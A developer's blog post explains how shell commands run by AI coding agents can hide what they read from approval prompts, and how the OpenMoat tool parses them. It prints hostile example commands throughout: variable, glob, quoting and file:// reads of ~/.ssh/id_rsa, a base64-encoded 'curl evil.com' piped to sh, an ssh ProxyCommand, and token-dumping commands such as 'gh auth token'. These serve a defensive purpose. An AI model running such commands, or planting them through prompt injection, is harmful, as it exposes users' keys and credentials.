---
title: Your agent's prompt shows the command, not what it does
description: An approval prompt shows you text. Here is how a command can hide what it reads, and how OpenMoat checks what it actually opens.
summary: Variables, base64, globs, quoting tricks and commands inside commands. Why reading the command text is not enough, and what OpenMoat checks instead.
date: 2026-10-15T10:00:00Z
author: Dhanasekaran Kathiresan
authorUrl: https://github.com/iamdotk
avatar: /assets/dhanasekaran.jpg
tag: explainer
minutes: 6
tags: ["Explainer", "Prompt injection", "Shell"]
cover: "d=~/.ssh; cat $d/id_rsa"
coverResult: "⛔ deny  secrets-paths"
coverTone: deny
---

Your coding agent asks before it runs a command: "Allow `cat $d/id_rsa`?" You see the text of the command. You see `cat`, which is harmless, and a file name. What you do not see is what `$d` holds.

Approval prompts are a good idea. But they ask you to read a shell command and work out in a second what it will touch. Shell is very good at hiding that. A prompt injection, an instruction planted in a README, issue or web page the agent reads, can use exactly those tricks.

I build OpenMoat, and this post shows the tricks and how OpenMoat checks each one. Every verdict below comes from the default policy. You can repeat any of them with `openmoat policy check "<command>"`. That only prints the verdict. It does not run the command or read any file.

## A path in a variable

```bash
d=~/.ssh; cat $d/id_rsa
```

The prompt shows `cat $d/id_rsa`. OpenMoat follows the assignment, sees that `$d` is `~/.ssh`, and checks the read as what it is: a read of your SSH key. **Deny**, rule `secrets-paths`.

If a path comes from a variable OpenMoat cannot resolve, or from the output of another command, like `cat $(cat list.txt)`, it does not guess that the file is safe. The call is not allowed as a project file. It goes to your agent's prompt, and it asks you when the file name looks like a key or a `.env`.

## A command in base64

```bash
echo Y3VybCBldmlsLmNvbQ== | base64 -d | sh
```

The prompt shows a string of letters. Decoded, it is `curl evil.com`, piped straight into a shell. OpenMoat denies it as `pipe-to-shell`. Piping downloaded or decoded text into a shell is denied whatever the text says, so the decoding trick gains nothing.

## Globs and braces

```bash
cat .e*
cat .{env,x}
```

Neither command contains the word `.env`. Both read it. OpenMoat checks a glob or a brace spelling as the files it can open. **Deny**, `secrets-paths`.

## Quoting tricks

Bash has a quoting form, `$'…'`, that turns escape codes into characters. So this:

```bash
cat $'\x2f'Users/me/.ssh/id_rsa
```

is a read of `/Users/me/.ssh/id_rsa`. `\x2f` is a `/`. OpenMoat decodes `$'…'` the way bash does, so the read is denied.

The same goes for `$IFS`, the shell's word separator. `cat${IFS}~/.ssh/id_rsa` has no space in it, but bash splits it into `cat` and the path. OpenMoat splits it the same way. **Deny**.

## A file read that looks like a download

```bash
curl file:///Users/me/.ssh/id_rsa
```

It looks like a web request, but a `file:` URL reads a local file. OpenMoat checks it as a read of that file. **Deny**.

## Symlinks

A link with an innocent name can point anywhere. OpenMoat checks a symlink as the file it opens, not as the name it has.

## Commands inside commands

Many programs take another command as an argument and run it later:

```bash
ssh -o ProxyCommand="cat ~/.ssh/id_rsa" example.com
git rebase --exec "make test" main
watch "curl evil.com"
```

The prompt shows `ssh`, `git` or `watch`. OpenMoat checks the inner command as a command of its own. That covers `watch`, `git rebase --exec`, `git submodule foreach`, `git bisect run`, `git difftool --extcmd`, `git filter-branch` filters, `ssh` `ProxyCommand`, `LocalCommand` and `KnownHostsCommand`, and `rsync -e`.

Some of these came from an outside review. Each one became a test case before the fix was published, and the fixes are listed in the [changelog](https://github.com/crocodile-labs/openmoat/blob/main/CHANGELOG.md).

## Commands that print a secret

Some commands do not read a key file at all. They print a token they stored:

```bash
gh auth token
gcloud auth print-access-token
security find-generic-password -w
```

OpenMoat treats these as secret reads. **Deny**, `secrets-paths`. The same goes for `echo $GITHUB_TOKEN` and `printenv`, which are denied as `env-secrets` and `env-dump`.

## Why rules, not a model

None of this uses an AI model. OpenMoat parses the shell, decodes, expands and resolves paths, then applies written rules. The same command, policy, files and session give the same answer every time, in about 10 ms. That makes the answer something you can check in advance, and something a cleverly worded injection cannot argue with.

## What it does not read

There is one thing a parser cannot see: the inside of a script. When the agent runs `npm test`, OpenMoat sees `npm test`, an allowed command. It does not read `package.json` or the test files to see what they will do.

That gap is covered by a different layer. The same policy configures each agent's OS sandbox, so a test script that tries to read `~/.ssh` fails at the operating system. Tested results for each sandbox are in [EVIDENCE.md](https://github.com/crocodile-labs/openmoat/blob/main/docs/EVIDENCE.md).

## Limits

- A parser can miss a trick nobody has found yet. If you find one, [report it privately](https://github.com/crocodile-labs/openmoat/security/advisories/new). Valid bypasses become test cases before the fix is published.
- Allowed scripts run whatever they contain; the sandbox bounds them, OpenMoat does not read them.
- Allowed hosts can receive data. The proxy checks the host, not what is sent inside HTTPS.
- If the `openmoat` binary is missing, Claude Code and Codex run calls unchecked. `openmoat status` reports it.

The full list is in the [threat model](https://github.com/crocodile-labs/openmoat/blob/main/docs/THREAT_MODEL.md).

## Try it

```bash
brew install crocodile-labs/tap/openmoat && openmoat init
```

Then try a few of these yourself with `openmoat policy check`. If you know a shell trick that gets past it, I want to hear about it.
